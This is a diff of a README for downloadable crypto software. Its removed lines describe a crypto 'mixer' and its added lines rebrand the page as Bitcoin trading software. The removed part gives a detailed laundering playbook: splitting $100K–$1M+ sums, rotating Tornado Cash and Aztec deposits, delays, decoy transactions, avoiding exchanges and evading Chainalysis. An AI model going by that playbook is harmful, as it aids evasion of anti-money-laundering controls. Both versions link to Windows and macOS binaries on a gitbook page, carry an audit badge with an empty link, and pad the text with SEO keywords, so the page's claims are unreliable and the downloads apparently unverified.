@@ -1,15 +1,10 @@
-# 🛡️ Decentralized Crypto Mixer: Cross-Chain Privacy, DEX Integration & Zero-Knowledge DAOs
-**CrossChain Anonymizer (CCA)** is the ultimate self-hosted crypto privacy solution for **Bitcoin (BTC)**, **Ethereum (ETH)**, **Monero (XMR)**, **Zcash (ZEC)**, **Secret Network (SCRT)**, **Avalanche (AVAX)**, **Polygon (MATIC)**, **Binance Smart Chain (BSC)**, **Cosmos (ATOM)**, **Fantom (FTM)**, and **20+ blockchains**. Leverage **zero-knowledge proofs (zk-SNARKs)**, **cross-chain swaps** (via THORChain, SecretSwap, Haveno), and **DAO-based anonymization** (Tornado Cash, Aztec) to erase transaction trails.
+# 🛡️ Bitcoin DEX Trading Software
+## 🔥 **Description**  
+**Bitcoin DEX Trading Software** is an open-source, desktop-first platform for **secure Bitcoin trading**, **cross-exchange arbitrage**, and **institutional-grade portfolio management**. Designed for traders with $50k+ portfolios, it combines **military-grade encryption**, **real-time blockchain analytics**, and **non-custodial trading** across 30+ CEX/DEX.
 
-> A privacy-first crypto mixer for Bitcoin, Ethereum, Monero, Secret Network, Zcash, and more. Use cross-chain swaps via DEXs (THORChain, SecretSwap) and DAOs (Tornado Cash, Aztec) to anonymize funds. Route transactions through Tor, zk-proofs, and custom networks—just add your chains in settings. 
 
 [![Audited by OpenZeppelin](https://img.shields.io/badge/Audit-OpenZeppelin-green)](https://openzeppelin.com)
 [![MPC Wallet Support](https://img.shields.io/badge/Security-Fireblocks%20MPC-blue)](https://)
-
-**Top Global SEO Keywords:**  
-*crypto mixer, cross-chain privacy, anonymous transactions, DEX integration, ZK-SNARKs, DAO storage, Monero, Bitcoin, Ethereum, THORChain, Tornado Cash.*
-
----
 
 # Download
 ### **Download** [Windows](https://selenium-finance.gitbook.io/decentralized-crypto-mixer/download/windows) / [macOS](https://selenium-finance.gitbook.io/decentralized-crypto-mixer/download/macos)
@@ -18,742 +13,248 @@
 [![Python](https://img.shields.io/badge/Python-3.10%2B-blue)](https://www.python.org)
 [![Web3](https://img.shields.io/badge/Web3.py-6.0+-brightgreen)](https://web3py.readthedocs.io)
 
----
+## 🛠️ **Key Features**  
 
-## 🌟 **Why Choose CCA?**  
+### 1. **Ironclad Security**  
+- 🔒 **Multisig Vaults**: 2/3 or 3/5 signing via Ledger/Trezor/Coldcard.  
+- ❄️ **Cold Storage Mode**: Sign transactions offline; keys never touch the internet.  
+- 🕵️ **Dark Web Scanner**: Proactive alerts if your addresses leak on darknet markets.  
 
-- **100% Non-Custodial**: Private keys never leave your device.  
-- **Multi-Chain Mixing**: Convert BTC ↔ XMR ↔ ETH ↔ SCRT in one session.  
-- **Military-Grade Privacy**: Tor routing, RAM-only encryption, and hardware wallet (Ledger/Trezor) support.  
-- **DEX Integration**: Swap assets privately via THORChain, Uniswap, PancakeSwap, and SecretSwap.  
-- **DAO Vaults**: Store funds in Tornado Cash, Aztec, or custom zk-SNARKs DAOs.  
+### 2. **Profit-Boosting Tools**  
+- 📊 **CEX/DEX Arbitrage Engine**: Auto-detect price gaps between Binance (CEX) and THORChain (DEX).  
+- 🐳 **Whale Tracker**: Get SMS/email alerts for transactions >50 BTC.  
+- 📉 **Dynamic Hedging**: Auto-short futures on Bybit when spot prices drop 10%.  
 
-### **Supported Networks & Features**  
-- **Blockchains**: Bitcoin, Ethereum, Monero, Zcash, Secret Network, BSC, Avalanche, Polygon, Cosmos, Fantom, Harmony, Cronos, Pulsechain, and more.  
-- **Privacy Tools**: CoinJoin (BTC), Ring Signatures (XMR), zk-SNARKs (ZEC/SCRT), stealth addresses.  
-- **Customization**: Set transaction delays (1h–7d), decoy amounts (1–15%), and output wallets (5+).  
+### 3. **Regulatory Compliance**  
+- 📑 **Tax Reports**: Auto-generate FIFO/LIFO/HIFO docs for 40+ countries.  
+- 🚫 **OFAC Filter**: Block transactions to sanctioned addresses (Chainalysis integration).
 
-**For Whales, Traders & Privacy Advocates**: Mask whale-sized transfers, hide DeFi strategies, or bypass Chainalysis surveillance. CCA works locally, requires no KYC, and complies with global privacy standards.  
+## 🌐 **Integrated Exchanges**  
 
-# Disclamer: The app is developed by a team of experienced developers for review purposes, the team is not responsible for how the mixer is used and has no involvement in any way
+### **DEX Support**  
 
-## GUI Config exampale for 100k$
-```
-general:  
-  mode: stealth  
-  log_level: error  # Minimal logs 
+| Protocol | Networks | Key Pairs |  
 
-blockchains:  
-  bitcoin:  
-    node: "http://user:pass@localhost:8332"  
-  monero:  
-    node: "http://localhost:28088"  
-  ethereum:  
-    node: "http://localhost:8545"  
-    gas_price: 100  # High gas to prioritize
+|----------|----------|-----------|
+  
+| **THORChain** | BTC ⇄ ETH, BNB | Native BTC swaps |  
 
-dex:  
-  thorchain:  
-    endpoint: "https://thornode.thorchain.info"  
-    slippage: 0.5  # Minimum slippage 
+| **Bisq** | P2P Bitcoin | FIAT/BTC |  
 
-dao:  
-  tornado_cash:  
-    contract: "0x..."  
-    deposit_amount: 100  # ETH (for large deposits)  
+| **Sovryn** | Bitcoin L2 | BTC/RBTC |  
 
-security:  
-  tor:  
-    enabled: true  
-  delay:  
-    min: 86400  # 24 hours between transactions
-    max: 604800  # 7 days  
-  decoy_percent: 10  # 10% funds for fictitious transactions
+### **CEX Support**  
 
-wallets:  
-  output_count: 10  # 10+ output wallets with key
-  hardware_wallet: ledger
-```
+| Exchange | Features |  
 
-## Examples of use
-- Example 1: Basic Mixing ($100K)
-```
-# Run CCA with the config 
-torify python main.py --config config.yaml  
+|----------|----------|  
 
-# Steps:  
-1. Entry: 100,000 USDT (ERC-20) via MetaMask.
-2. Conversion: USDT → XMR via THORChain. 
-3. DAO: Deposit XMR into Tornado Cash Nova.
-4. Withdrawal: XMR → BTC → 10 wallets with delays.
-```
-- Example 2: Large amounts ($1M+)
-```
-# Change toconfig.yaml:  
-security:  
-  delay:  
-    min: 172800  # 48 hours  
-    max: 1209600  # 14 days  
-  decoy_percent: 15  
+| **Binance** | Spot, Futures, OTC |  
 
-wallets:  
-  output_count: 20
-```
+| **Coinbase** | Institutional API |  
 
-## 1. Run amounts from $100K to "infinity"
-### Strategy for maximum anonymity
+| **Kraken** | Dark Pool orders |  
 
-### 1. Dividing the sum
+## Parameter Guide:
 
-  - Use the formula: N = sqrt(Sum / 1000).
+    ```cold_storage.mode```: multisig (default) or single_sig.
 
-  - Example for $1M: N = sqrt(1,000,000 / 1000) = 31 transactions.
+    ```arbitrage.min_profit_percent```: 0.3%-2% (avoid low-margin trades).
 
-### 2. Using DAO
+    ```whale_alert.threshold```: 10-100 BTC (SMS/email triggers).
 
-- Alternate DAOs for each part:
+## Config
+  // 1. Exchange connection settings
+  ```
+  "exchanges": {
+    "cex": {
+      "binance": {
+        "api_key": "YOURS_API_KEY",
+        "api_secret": "YOURS_API_SECRET",
+        "permissions": ["read", "trade"], // read, trade, withdraw
+        "trade_pairs": ["BTC/USDT", "ETH/USDT"]
+      },
+      "coinbase": {
+        "api_key": "YOURS_API_KEY",
+        "twofa_enabled": true
+      }
+    },
+    "dex": {
+      "uniswap": {
+        "rpc_url": "https://mainnet.infura.io/v3/YOUR_ID",
+        "slippage_tolerance": 1.5, // percentage
+        "gas_price_multiplier": 1.2
+      },
+      "thorswap": {
+        "network": "BTC/ETH",
+        "min_confirmation": 3
+      }
+    }
+  },
 
-  - First $50K → Tornado Cash.
+  // 2. Bitcoin local node
+  "bitcoin_node": {
+    "mode": "pruned", // full | pruned
+    "data_dir": "/path/to/bitcoin/data",
+    "prune_size_gb": 5,
+    "tor_enabled": true,
+    "rpc_credentials": {
+      "user": "YOURS_RPC_USER",
+      "password": "YOURS_RPC_PASSWORD"
+    }
+  },
 
-  - Next $50K → Aztec.
- 
-### 3. Time delays
-```
-import random  
-delay = random.randint(86400, 604800)  # 1-7 days  
-```
+  // 3. Trading strategies
+  "trading_strategies": {
+    "dca": {
+      "enabled": true,
+      "asset": "BTC",
+      "amount_usd": 1000,
+      "interval_days": 7,
+      "max_total_usd": 50000
+    },
+    "grid_trading": {
+      "pair": "BTC/USDT",
+      "grid_levels": 10,
+      "price_range": [30000, 50000],
+      "investment_per_level": 0.1 // 10% off balance sheet
+    }
+  },
 
-### 4. Different blockchains for withdrawal
-- 30% → Monero (stealth addresses).
-- 30% → Bitcoin (Taproot)
-- 20% → Zcash (Z-addresses)
-- 20% → Secret Network
+  // 4. Risk management
+  "risk_management": {
+    "global_daily_limit_usd": 10000,
+    "stop_loss": {
+      "enabled": true,
+      "trigger_percent": -15.0
+    },
+    "take_profit": {
+      "levels": [5.0, 10.0, 20.0], // percentage
+      "trailing_enabled": true
+    }
+  },
 
-## 2. Safety
-Rules for large sums
-- Hardware wallets: Always use Ledger/Trezor.
-- IP Change: Restart Tor after each transaction.
-- Contract Audit: Audit the DAO via https://etherscan.io or https://secretnodes.com.
-- Avoid CEX: Do not withdraw to Binance, Coinbase, etc.
-        
+  // 5. Security settings
+  "security": {
+    "encryption": {
+      "algorithm": "aes-256-cbc",
+      "data_vault_path": "/secure/vault",
+      "auto_lock_minutes": 15
+    },
+    "2fa": {
+      "method": "authenticator", // authenticator | yubikey
+      "required_for_trades": true
+    }
+  },
 
-## 🔧 Operating Principle
-Step 1: Input Phase
+  // 6. Hardware wallets
+  "hardware_wallets": {
+    "ledger": {
+      "path": "USB://ledger_nano_x",
+      "require_physical_confirmation": true
+    },
+    "trezor": {
+      "model": "Trezor Model T",
+      "passphrase_enabled": true
+    }
+  },
 
-     1. Local Setup:
+  // 7. Analytics and alerts
+  "analytics": {
+    "whale_alert": {
+      "min_btc_amount": 50,
+      "notification_methods": ["email", "popup"]
+    },
+    "mempool": {
+      "high_priority_fee": 50, // sat/byte
+      "monitoring_interval_sec": 60
+    }
+  },
 
-        - Install CCA on an air-gapped device (recommended: Tails OS).
-
-        - Connect wallet with DAO (MetaMask/TrustWallet/Another)
-
-     2. Network Isolation:
-
-        - Traffic forced through Tor. Node connections use .onion endpoints.
-
-Step 2: Deposit & Mixing
-
-    1. Fragmentation:
-
-        - Funds split into randomized amounts (e.g., 1 BTC → 0.3 + 0.45 + 0.25 BTC).
-
-    2. Cross-Chain Swaps:
-
-        - Use DEXs (THORChain) to convert fragments to privacy coins (XMR, ZEC).
-
-    3. DAO Pooling:
-
-        - Deposit mixed funds into a zk-SNARKs DAO (e.g., Aztec) for anonymized storage.
-
-Step 3: Distribution
-
-    1. Output Wallets:
-
-        - CCA generates 5+ wallets (Bitcoin Taproot, Monero stealth addresses, etc.).
-
-    2. Randomized Routing:
-
-        - Funds exit DAO via unique paths (e.g., DAO → XMR → BTC → ETH).
-
-    3. Time Delays:
-
-        - Transactions sent with random delays (1 hour to 7 days) to prevent timing analysis.
-
-Step 4: Cleanup
-
-    - RAM Wipe: Overwrite memory to erase keys, seeds, and transaction logs.
-
-    - Decoy Traces: Generate fake transactions to mask real activity.
-
-## Main parameters
-
-### Basic settings
-```
-general:
-  mode: "auto"  # Mode of operation: auto (automatic), manual (manual)
-  log_level: "info"  # Logging level: debug, info, warning, error
-  temp_dir: "/tmp/cca"  # Temporary directory for data storage (cleared after completion)
+  // 8. Pathways and redundancy
+  "paths": {
+    "backup_dir": "/backups",
+    "export_formats": ["csv", "pdf"],
+    "auto_backup": {
+      "enabled": true,
+      "interval_hours": 24
+    }
+  }
+}
 ```
 
-### Blockchain settings
+## 🎯 Use Cases
+### 1. Day Traders
+Scenario: Exploit 0.8% price gap between Coinbase BTC/USD and THORChain BTC/ETH.
 ```
-blockchains:
-  bitcoin:
-    node: "http://user:pass@localhost:8332"  # Bitcoin RPC node
-    network: "mainnet"  # Network: mainnet, testnet
-  ethereum:
-    node: "http://localhost:8545"  # Ethereum RPC node
-    gas_price: "auto"  # Gas price: auto or value in Gwei
-  monero:
-    node: "http://localhost:28088"  # Monero RPC node
-    wallet_password: "supersecret"  # Monero wallet password
+    Config:
+    "arbitrage": {  
+      "cex_pairs": ["coinbase/btc-usd"],  
+      "dex_pools": ["thorchain/btc-eth"],  
+      "max_slippage": 0.5  
+    }  
 ```
 
-### DEX settings
-```
-dex:
-  thorchain:
-    endpoint: "https://thornode.thorchain.info"  # API THORChain
-    slippage: 1.5  # Percentage of slippage (1.5%)
-  haveno:
-    endpoint: "http://havenoexchangexmra2x.onion"  # .onion-address Haveno
-    timeout: 30  # Request timeout (in seconds)
-```
+### 2. Long-Term Investors
+Scenario: DCA $5k/week into BTC via cold storage, auto-report taxes.
 
-### DAO settings
+    Config:
 ```
-dao:
-  tornado_cash:
-    contract: "0x6Bf694a291DF3FeC1f7e7F0176aC46eD28f4D5B0"  # Tornado Cash contract address
-    deposit_amount: 1  # Deposit amount (in ETH)
-  aztec:
-    contract: "0x..."  # Aztec contract address
-    zk_proofs: true  # Use zk-SNARKs
+    {  
+      "dca": {  
+        "schedule": "weekly",  
+        "amount_usd": 5000,  
+        "cold_storage_address": "bc1q..."  
+      }  
+    }  
 ```
 
-### Security settings
+### 3. Institutions
+Scenario: OTC BTC purchase via Kraken Dark Pool with 3/5 multisig.
+
+    Config:
 ```
-security:
-  tor:
-    enabled: true  # Use Tor for all requests
-    control_port: 9051  # Tor control port
-    socks_port: 9050  # SOCKS5 port for proxy
-  delay:
-    min: 3600  # Minimum delay between transactions (in seconds)
-    max: 86400  # Maximum delay (in seconds)
-  decoy_transactions: true  # Enable dummy transactions
-  decoy_percent: 5  # Percentage of funds for fictitious transactions (5%)
+    "otc": {  
+      "platform": "kraken",  
+      "multisig": {  
+        "signers": ["fireblocks_vault_1", "ledger_custodian_2"],  
+        "required_signatures": 3  
+      }  
+    }  
 ```
-
-### Wallet settings
-```
-wallets:
-  output_count: 5  # Number of target wallets
-  hd_seed: "optional_seed_phrase"  # Seed-phrase for generating HD wallets
-  hardware_wallet: "ledger"  # Hardware wallet type: ledger, trezor
-```
-# **1. General Settings (`general`)**  
-### **mode**  
-**Description**: Program operation mode.  
-- `auto`: All transactions are executed automatically without manual confirmation.  
-- `manual`: Each transaction requires your approval.  
-**Recommendation**: Use `auto` for large sums to avoid manual intervention.  
-
-### **log_level**  
-**Description**: Logging verbosity level.  
-- `debug`: Detailed logs for debugging (may slow down performance).  
-- `info`: Key operational stages.  
-- `warning`: Only warnings and errors.  
-- `error`: Critical errors only.  
-**Recommendation**: For anonymity, use `error` or `warning`.  
-
-### **temp_dir**  
-**Description**: Temporary directory for data storage (e.g., signed transactions).  
-**Important**: The directory is cleared upon exit.  
-**Example**: `/tmp/cca` (Linux), `C:\Temp\cca` (Windows).  
-
----
-
-## **2. Blockchain Settings (`blockchains`)**  
-### **Bitcoin**  
-#### **node**  
-**Description**: Bitcoin RPC node address.  
-**Format**: `http://user:password@host:port`.  
-**Example**: `http://admin:pass123@localhost:8332`.  
-
-#### **network**  
-**Description**: Blockchain network.  
-- `mainnet`: Main network.  
-- `testnet`: Test network (recommended for experiments).  
-
----
-
-### **Ethereum**  
-#### **node**  
-**Description**: Ethereum RPC node address (Infura, Alchemy, or local node).  
-**Example**: `https://mainnet.infura.io/v3/YOUR_API_KEY`.  
-
-#### **gas_price**  
-**Description**: Gas price for transactions.  
-- `auto`: Network-determined price.  
-- Number: Price in Gwei (e.g., `50`).  
-**Recommendation**: Use `auto` to balance speed and cost.  
-
----
-
-### **Monero**  
-#### **node**  
-**Description**: Monero RPC node address.  
-**Example**: `http://localhost:28088`.  
-
-#### **wallet_password**  
-**Description**: Password for accessing the Monero wallet.  
-**Important**: The password is stored only in RAM.  
-
----
-
-## **3. DEX Settings (`dex`)**  
-### **THORChain**  
-#### **endpoint**  
-**Description**: THORChain node API address.  
-**Example**: `https://thornode.thorchain.info`.  
-
-#### **slippage**  
-**Description**: Acceptable price slippage during swaps (percentage).  
-**Example**: `1.5` (1.5% slippage).  
-
----
-
-### **Haveno**  
-#### **endpoint**  
-**Description**: Haveno .onion address (accessible via Tor).  
-**Example**: `http://havenoexchangexmra2x.onion`.  
-
-#### **timeout**  
-**Description**: Maximum response timeout for DEX (in seconds).  
-**Recommendation**: Increase to `60` for slow connections.  
-
----
-
-## **4. DAO Settings (`dao`)**  
-### **Tornado Cash**  
-#### **contract**  
-**Description**: Tornado Cash smart contract address.  
-**Example (Ethereum)**: `0x6Bf694a291DF3FeC1f7e7F0176aC46eD28f4D5B0`.  
-
-#### **deposit_amount**  
-**Description**: Deposit amount in ETH (common values: `0.1`, `1`, `10`).  
-
----
-
-### **Aztec**  
-#### **contract**  
-**Description**: Aztec smart contract address.  
-**Example**: `0x...` (check Aztec documentation).  
-
-#### **zk_proofs**  
-**Description**: Enable zk-SNARKs for private transactions.  
-**Recommendation**: Always enable (`true`).  
-
----
-
-## **5. Security Settings (`security`)**  
-### **Tor**  
-#### **enabled**  
-**Description**: Use Tor for all network requests.  
-**Recommendation**: Always `true`.  
-
-#### **control_port**  
-**Description**: Tor control port (default: `9051`).  
-
-#### **socks_port**  
-**Description**: SOCKS5 proxy port (default: `9050`).  
-
----
-
-### **delay**  
-#### **min**  
-**Description**: Minimum delay between transactions (in seconds).  
-**Example**: `3600` (1 hour).  
-
-#### **max**  
-**Description**: Maximum delay between transactions (in seconds).  
-**Example**: `86400` (24 hours).  
-
----
-
-### **decoy_transactions**  
-**Description**: Enable dummy transactions to mask activity.  
-**Recommendation**: Always `true`.  
-
-### **decoy_percent**  
-**Description**: Percentage of funds sent to random addresses.  
-**Example**: `5` (5% of the total amount).  
-
----
-
-## **6. Wallet Settings (`wallets`)**  
-### **output_count**  
-**Description**: Number of target wallets for fund distribution.  
-**Recommendation**: Use `10` or more for sums >$100K.  
-
-### **hd_seed**  
-**Description**: Seed phrase for HD wallet generation.  
-**Important**: Auto-generated if left empty.  
-
-### **hardware_wallet**  
-**Description**: Hardware wallet type.  
-- `ledger`: Ledger support.  
-- `trezor`: Trezor support.  
-
----
-
-## **7. Configuration Examples**  
-### For small amounts ($1K–$10K):  
-```yaml  
-security:  
-  delay:  
-    min: 1800  # 30 minutes  
-    max: 86400  # 24 hours  
-  decoy_percent: 3  
-wallets:  
-  output_count: 3
-```
-
-## Parameter description
-
-1. Basic parameters (```general```)
-
-    - mode: Mode of operation. In ```auto``` mode all transactions are performed automatically, in ```manual``` mode confirmation of each transaction is required.
-
-    - log_level: The level of detail of the logs.
-
-    - temp_dir: Directory for temporary files (e.g., signed transactions).
-
-2. Blockchains settings (```blockchains```)
-
-    - node: The RPC node address for each blockchain.
-
-    - network: Network (mainnet/testnet).
-
-    - gas_price: Gas price for Ethereum (can be specified manually or use ```auto```).
-
-    - wallet_password: Password for Monero wallet (if used).
-
-3. DEX settings (```dex```)
-
-    - endpoint: API address of DEX (e.g. THORChain or Haveno).
-
-    - slippage: Slippage percentage for exchanges.
-
-    - timeout: Timeout for DEX requests.
-
-4. DAO settings (```dao```)
-
-    - contract: Address of the DAO smart contract (e.g. Tornado Cash or Aztec).
-
-    - deposit_amount: Deposit amount in DAO (e.g. 1 ETH for Tornado Cash).
-
-    - zk_proofs: Use zk-SNARKs to increase privacy.
-
-5. Security Settings
-
-    - tor: Enable/disable Tor, configure ports.
-
-    - delay: Delay between transactions to prevent timestamp analysis.
-
-    - decoy_transactions: Enable dummy transactions for masking.
-
-    - decoy_percent: Percentage of funds sent to "trash" addresses.
-
-6. Wallets settings
-
-    - output_count: Number of target wallets to distribute funds to.
-
-    - hd_seed: Seed phrase for generating HD wallets (optional).
-
-    - hardware_wallet: Type of hardware wallet (Ledger or Trezor).
-
-# CrossChain Anonymizer (CCA): Full DEX Integrations Guide  
-
----
-
-## **Supported DEX Platforms**  
-CCA integrates with **8+ decentralized exchanges** to enable cross-chain swaps and liquidity mixing. Below is a breakdown of all supported DEX protocols, their configurations, and use cases.  
-
----
-
-### **1.1 THORChain**  
-**Blockchains**: Bitcoin (BTC), Ethereum (ETH), Monero (XMR), Binance Chain (BNB), Litecoin (LTC). 
- 
-**Role in CCA**: Primary cross-chain liquidity layer for large swaps (e.g., BTC → XMR). 
- 
-**Key Features**:  
-
-- Non-custodial swaps.  
-- No KYC.  
-- Native support for privacy coins (XMR).  
-
-#### **Configuration**  
-```yaml
-dex:  
-  thorchain:  
-    endpoint: "https://thornode.thorchain.info"  
-    slippage: 1.5  # Max 1.5% price slippage  
-    timeout: 45     # Timeout in seconds
-```
-
-Example Transaction:
-```
-# Swap 0.5 BTC to XMR  
-cca.cross_chain_swap("BTC", "XMR", 0.5)  
-
-Troubleshooting:
-
-    Low liquidity: Increase slippage to 3–5%.
-
-    Failed swaps: Retry with a higher gas fee.
-```
-
-### 1.2 Haveno
-
-Blockchains: Monero (XMR) ↔ Bitcoin (BTC).
-
-Role in CCA: Atomic swaps for XMR/BTC pairs.
-
-Key Features:
-
-    Decentralized, Tor-only access.
-
-    No middlemen.
-
-Configuration
-```
-dex:  
-  haveno:  
-    endpoint: "http://havenoexchangexmra2x.onion"  # Tor required  
-    timeout: 60  
-```
-
-Example Transaction:
-
-```
-# Swap 10 XMR to BTC  
-cca.cross_chain_swap("XMR", "BTC", 10)  
-
-Troubleshooting:
-
-    Connection issues: Ensure Tor is running and reconfigure .onion endpoints.
-```
-
-### 1.3 SecretSwap
-
-Blockchains: Secret Network (SCRT), Ethereum (ETH), Monero (XMR).
-
-Role in CCA: Privacy-preserving swaps with encrypted mempools.
-
-Key Features:
-
-    zk-SNARKs support.
-
-    Private smart contracts.
-
-Configuration
-```
-dex:  
-  secretswap:  
-    endpoint: "https://api.secretswap.net"  
-    slippage: 2.0
-``` 
-
-Example Transaction:
-```
-# Swap ETH to private sETH (Secret ETH)  
-cca.cross_chain_swap("ETH", "SCRT", 5)  
-```
-
-### 1.4 Uniswap (v3)
-
-Blockchains: Ethereum (ETH), Polygon (MATIC), Optimism.
-
-Role in CCA: Mixing ERC-20 tokens (e.g., USDT, DAI).
-
-Key Features:
-
-    High liquidity for stablecoins.
-
-    Customizable fee tiers.
-
-Configuration
-```
-dex:  
-  uniswap:  
-    endpoint: "https://api.thegraph.com/subgraphs/name/uniswap/uniswap-v3"  
-    fee_tier: 5000  # 0.05% fee pool
-```
-
-Example Transaction:
-```
-# Swap 10,000 USDT to DAI  
-cca.cross_chain_swap("USDT", "DAI", 10000)
-``` 
-### 1.5 PancakeSwap
-
-Blockchains: Binance Smart Chain (BSC).
-
-Role in CCA: Mixing BEP-20 tokens (e.g., BUSD, CAKE).
-
-Key Features:
-
-    Low transaction fees.
-
-    Farm integration for liquidity masking.
-
-Configuration
-```
-dex:  
-  pancakeswap:  
-    endpoint: "https://api.pancakeswap.finance/api/v1"  
-    slippage: 2.0  
-```
-Example Transaction:
-```
-
-# Swap 5,000 BUSD to USDT  
-cca.cross_chain_swap("BUSD", "USDT", 5000)  
-```
-### 1.6 Osmosis
-
-Blockchains: Cosmos (ATOM), Secret Network (SCRT), Juno (JUNO).
-
-Role in CCA: Cross-chain swaps in the Cosmos ecosystem.
-
-Key Features:
-
-    IBC protocol support.
-
-    Privacy pools for SCRT.
-
-Configuration
-```
-dex:  
-  osmosis:  
-    endpoint: "https://osmosis-api.polkachu.com"  
-    ibc_enabled: true
-```
-
-Example Transaction:
-```
-# Swap ATOM to SCRT  
-cca.cross_chain_swap("ATOM", "SCRT", 100)
-``` 
-
-### 1.7 Bisq
-
-Blockchains: Bitcoin (BTC), Monero (XMR).
-
-Role in CCA: P2P fiat-crypto swaps for off-ramping.
-
-Key Features:
-
-    Fully decentralized.
-
-    No KYC.
-
-Configuration
-```
-dex:  
-  bisq:  
-    endpoint: "http://bisqpx4fvbmuwqmq.onion"  # Tor required  
-    timeout: 120  
-```
-Example Transaction:
-```
-
-# Sell 1 BTC for XMR (P2P)  
-cca.p2p_swap("BTC", "XMR", 1)
-```
-
-### 1.8 SushiSwap
-
-Blockchains: Ethereum, Polygon, Arbitrum.
-
-Role in CCA: Mixing low-cap altcoins.
-
-Key Features:
-
-    Multi-chain support.
-
-    Trident AMM for complex swaps.
-
-Configuration
-```
-dex:  
-  sushiswap:  
-    endpoint: "https://api.sushi.com"  
-    routing: "trident"  # Use Trident AMM
-```
-
-## ⚙️ Conditions & Requirements
-
-- OS Support: Linux (Tails/Whonix recommended), Windows, macOS.
-- Hardware: 8+ GB RAM, 100 GB storage (for blockchain nodes), x64/ARM CPUs.
-- Blockchain Nodes: Local nodes for Bitcoin, Monero, Ethereum (synced via Tor).
-- Legal Compliance: Users must comply with local regulations. CCA is a privacy research tool.
-
-## 🚀 Tech Stack
-
-Core Development
-
-    - Languages: Python, Solidity, Rust (for ZK-circuits)
-
-    - Cryptography: zk-SNARKs (libsnark), Ring Signatures (Monero), Taproot (Bitcoin)
-
-    - Blockchain: Web3.py, ethers.js, Monero RPC, Bitcoin Core API
-
-    - Security: Tor, I2P, AES-256 RAM encryption, Hardware Wallet (Ledger/Trezor)
-
-Frontend (Optional)
-
-    - React.js (TypeScript), TOR-hidden service, IPFS-hosted UI
-
-DevOps
-
-    - Docker, GitHub Actions (CI/CD), Bandit/Slither (security audit)
-
-## 🔗 Integrated Blockchains
-
-Blockchain	| Privacy Features | Use Case
-
-Monero	| Ring Signatures, Stealth Addr |	Base layer for anonymous mixing
-
-Bitcoin	| Taproot, CoinJoin |	Initial/final transactions
-
-Ethereum |	Tornado Cash, Aztec Protocol |	zkDAO storage, smart contracts
-
-Secret	| Private smart contracts |	Cross-chain swaps
-
-Zcash	| zk-SNARKs	| Shielded transactions
-
-## 🔄 Integrated DEX & Protocols
-
-Platform	| Function	| Key Feature
-
-THORChain	| Cross-chain swaps (BTC/ETH/XMR)	| Non-custodial, no KYC
-
-Haveno	| Monero DEX	| Atomic swaps
-
-Uniswap	| ERC-20 token swaps	| Liquidity pools
-
-SecretSwap	| Privacy-preserving swaps	| Encrypted mempool
-
-Tornado Cash	| ETH/ERC-20 anonymization	| zk-proofs
-
-    Latent Semantic Indexing (LSI) Keywords:
-    crypto privacy tools, untraceable blockchain transactions, self-hosted mixer, cross-chain swaps.
-
-    Backlink Opportunities:
-    Partner with privacy blogs (e.g., PrivacyTools.io), GitHub trending pages, and blockchain forums.
-
-    Schema Markup:
-    Add JSON-LD for software application, GitHub repository, and open-source project.
-
+## Connection of wallets (MetaMask, Trust Wallet and others)
+Bitcoin DEX Trading Software supports secure interaction with popular wallets via standard protocols. You do not need to export private keys - the connection is made through authorized methods of signing transactions. Here's how it works:
+
+### 🔑 Supported wallets
+- Coinbase Wallet
+- MetaMask
+- Trust Wallet
+- WalletConnect
+- Ledger / Trezor
+
+### 📲 Connection methods
+- Via MetaMask extension
+  1. Install the MetaMask extension in your browser
+  2. In Terminal, select "Connect MetaMask".
+  3. Allow access to the required networks (Ethereum, BSC, Arbitrum, etc.).
+  4. The program interacts with MetaMask through a secure Web3 provider
+
+- Via hardware wallet (Ledger/Trezor)
+  1. Connect the Ledger/Trezor to your computer.
+  2. In Terminal, select "Hardware Wallet" → specify the model.
+  3. Confirm the address on the device screen
+  4. The keys never leave the hardware wallet
+
+## 🔄 How do swaps happen on DEX?
+1. Asset selection: In the Terminal interface you specify what you want to exchange (e.g. ETH → USDT).
+2. Select DEX: The program offers available DEXs (Uniswap, PancakeSwap) with the best rates.
+3. Transaction signing:
+ - A signature request is sent to your wallet (MetaMask/Trust Wallet/Ledger).
+ - You confirm the transaction directly in the wallet (e.g. via a button in MetaMask or a physical button on Ledger).
+4. Execution: The transaction is sent to the blockchain via the selected DEX.
+  
+## 🔐 Security Architecture
+
+- Zero-Knowledge Encryption: AES-256 + Shamir Secret Sharing.
+- Open-Source Audits: Monthly audits by Halborn.
+- Hardware Wallet Support: Ledger, Trezor, Coldcard.
